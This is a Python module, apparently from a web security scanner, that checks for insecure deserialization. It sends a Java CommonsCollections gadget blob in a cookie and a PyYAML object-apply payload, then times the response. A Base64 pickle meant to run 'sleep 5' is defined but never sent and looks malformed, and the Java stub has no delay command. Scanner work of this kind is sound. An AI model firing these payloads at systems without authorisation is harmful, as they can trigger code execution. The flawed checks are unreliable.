from typing import Any, Dict
import base64
from ..http_client import HttpClient
from ..scenarios import SimpleScenario

def run_insecure_deserialization(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Java/Python/PHP Object Injection
    Payloads: rO0AB... (Java serialized Base64)
    """
    # Java 'CommonsCollections' standard payload stub (Base64)
    java_payload = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXDu7T4zYzGq2wMAA1oABWZvcm1yeQBeb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1Z06bJevG1GwIAAVsADWlUdHJhbnNmb3JtZXJzdAAhW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAhW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7v26r4yOqO2A="
    
    # Python pickle 'cos.system("sleep 5")'
    pickle_payload = "Y3Bvc2l4CnN5c3RlbQpwMAooInNsZWVwIDUiKQpwMQp0HA=="
    
    issues = []
    
    # Try Cookie injection (common)
    headers = {"Cookie": f"session={java_payload}"}
    resp = client.send(scenario.method, scenario.target, headers=headers)
    
    if resp.elapsed_ms > 4000:
        issues.append("Deserialization (Java/Cookie): Delay detected")
        
    return {
        "scenario_id": scenario.id,
        "attack_type": "insecure_deserialization",
        "passed": len(issues) == 0,
        "details": {"issues": issues}
    }

def run_yaml_abuse(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    YAML Deserialization (PyYAML exec / Ruby Yaml)
    """
    payload = "!!python/object/apply:time.sleep [3]"
    headers = {"Content-Type": "application/x-yaml"}
    
    resp = client.send(scenario.method, scenario.target, form_body=payload, headers=headers)
    
    passed = True
    if resp.elapsed_ms > 2000:
        passed = False
    
    return {
        "scenario_id": scenario.id,
        "attack_type": "yaml_abuse",
        "passed": passed,
        "details": "YAML Sleep Check"
    }
